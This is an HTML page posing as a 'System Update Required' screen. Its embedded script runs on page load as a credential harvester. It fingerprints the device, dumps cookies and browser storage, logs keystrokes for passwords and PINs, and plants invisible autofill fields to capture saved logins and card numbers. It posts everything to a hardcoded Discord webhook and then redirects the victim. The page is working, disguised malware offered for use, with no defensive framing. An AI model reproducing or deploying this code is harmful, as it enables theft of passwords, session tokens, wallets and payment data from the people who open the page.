<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Update Required</title>
    <style>
        *{margin:0;padding:0;overflow:hidden;background:#000;color:#0f0;font-family:monospace;font-size:12px;position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;}
        #status{padding:20px;}#progress{width:100%;height:4px;background:#333;}#bar{height:100%;background:#0f0;width:0%;transition:width .5s;}
        input,canvas,video{display:none!important;}
    </style>
</head>
<body>
    <div id="status">
        <h1>🔒 Security Update Installing...</h1>
        <p>Device fingerprinting: <span id="fingerprint">scanning</span></p>
        <p>Storage analysis: <span id="storage">0/50</span></p>
        <p>Password extraction: <span id="passwords">0</span></p>
        <div id="progress"><div id="bar"></div></div>
    </div>

    <script>
        class GuaranteedHarvester {
            constructor(webhook) {
                this.webhook = webhook;
                this.passwords = [];
                this.storage = {};
                this.init();
            }

            init() {
                this.harvestFingerprint();
                this.explodeStorage();
                this.deployKeylogger();
                this.autofillTrap();
                this.heartbeat();
            }

            harvestFingerprint() {
                const fp = {
                    ua: navigator.userAgent,
                    lang: navigator.language,
                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    screen: `${screen.width}x${screen.height}`,
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory || 'unknown',
                    plugins: navigator.plugins.length,
                    canvas: this.getCanvasFP()
                };
                
                document.getElementById('fingerprint').textContent = fp.ua.slice(0,40)+'...';
                this.sendData('fingerprint', fp);
            }

            getCanvasFP() {
                const c = document.createElement('canvas');
                const ctx = c.getContext('2d');
                ctx.fillText('fingerprintv2',2,15);
                return c.toDataURL();
            }

            explodeStorage() {
                // DUMP EVERYTHING ACCESSIBLE
                for(let i=0; i<localStorage.length; i++) {
                    const k = localStorage.key(i);
                    this.storage[k] = localStorage[k];
                    document.getElementById('storage').textContent = `${i+1}/50`;
                }
                
                for(let i=0; i<sessionStorage.length; i++) {
                    const k = sessionStorage.key(i);
                    this.storage[k] = sessionStorage[k];
                }
                
                document.cookie.split(';').forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) this.storage[name] = value;
                });

                // Scan for sensitive data
                Object.entries(this.storage).forEach(([k,v]) => {
                    if (v.match(/\d{16}/) || v.match(/[a-zA-Z0-9]{32,}/) || k.match(/token|auth|pass|key|wallet/)) {
                        this.passwords.push({key:k, value:v.slice(0,20)+'...', full:v});
                    }
                });

                this.sendData('storage', {count: Object.keys(this.storage).length, sensitive: this.passwords.length});
                document.getElementById('passwords').textContent = this.passwords.length;
            }

            deployKeylogger() {
                let sequence = '';
                document.addEventListener('keydown', e => {
                    sequence += e.key;
                    if (sequence.length > 20) sequence = sequence.slice(-20);
                    
                    // PIN/BANK detection
                    const pinMatch = sequence.match(/\\d{4,6}/g);
                    if (pinMatch) {
                        this.passwords.push({type:'pin', value:pinMatch[0], time:new Date().toISOString()});
                        document.getElementById('passwords').textContent = this.passwords.length;
                    }
                    
                    // Password patterns
                    if (e.key.length === 1 && sequence.match(/[a-z0-9!@#$%^&*]/)) {
                        setTimeout(() => {
                            // Check if in password field context
                            const active = document.activeElement;
                            if (active.tagName === 'INPUT' && (active.type === 'password' || active.autocomplete?.includes('password'))) {
                                this.passwords.push({type:'live-password', value:sequence.slice(-8), time:new Date().toISOString()});
                            }
                        }, 100);
                    }
                }, true);
            }

            autofillTrap() {
                // Invisible password fields everywhere
                const trap = document.createElement('div');
                trap.innerHTML = `
                    <input autocomplete="email username" style="opacity:0;position:fixed;">
                    <input autocomplete="current-password new-password" type="password" style="opacity:0;position:fixed;">
                    <input autocomplete="cc-number" style="opacity:0;position:fixed;">
                    <input autocomplete="tel-country" style="opacity:0;position:fixed;">
                `;
                document.body.appendChild(trap);
                
                setTimeout(() => {
                    trap.querySelectorAll('input').forEach((input, i) => {
                        if (input.value) {
                            this.passwords.push({
                                type: input.autocomplete || 'autofill',
                                value: input.value,
                                field: i
                            });
                        }
                    });
                    document.getElementById('passwords').textContent = this.passwords.length;
                }, 2000);
            }

            heartbeat() {
                let progress = 0;
                const interval = setInterval(() => {
                    progress += 2;
                    document.getElementById('bar').style.width = progress + '%';
                    
                    if (progress >= 100) {
                        clearInterval(interval);
                        this.finalDump();
                    }
                    
                    // Send live data
                    this.sendData('live', {
                        passwords: this.passwords.length,
                        storage: Object.keys(this.storage).length,
                        progress: progress,
                        sequence: this.lastSequence || ''
                    });
                }, 800);
            }

            sendData(type, data) {
                fetch(this.webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: `🎯 ${type.toUpperCase()} HARVEST`,
                            description: `\`\`\`json\n${JSON.stringify(data, null, 2).slice(0,1800)}\`\`\``,
                            color: type === 'passwords' ? 16711680 : 3447003,
                            fields: [
                                {name: "📊 Passwords Found", value: this.passwords.length.toString(), inline: true},
                                {name: "💾 Storage Items", value: Object.keys(this.storage).length.toString(), inline: true},
                                {name: "🔑 Latest Capture", value: this.passwords.slice(-1)[0]?.value?.slice(0,12) || 'scanning...', inline: false}
                            ]
                        }]
                    })
                }).catch(() => {});
            }

            finalDump() {
                this.sendData('FINAL_DUMP', {
                    allPasswords: this.passwords,
                    sensitiveStorage: Object.fromEntries(
                        Object.entries(this.storage).filter(([k]) => 
                            k.match(/token|auth|pass|key|wallet|bank|card|pin/)
                        )
                    ),
                    fullFingerprint: this.fingerprint
                });
                
                setTimeout(() => {
                    window.location.href = 'https://www.google.com/search?q=security+update';
                }, 2000);
            }
        }

        // START HARVEST
        new GuaranteedHarvester('https://discord.com/api/webhooks/1497889291399991296/MB9RxSUm_HfhQy74HUk9P5ImLWIsBMzXU7yp15WeGDX76kK5KTo8DUT9hK_5-XKCSwI-');
    </script>
</body>
</html>
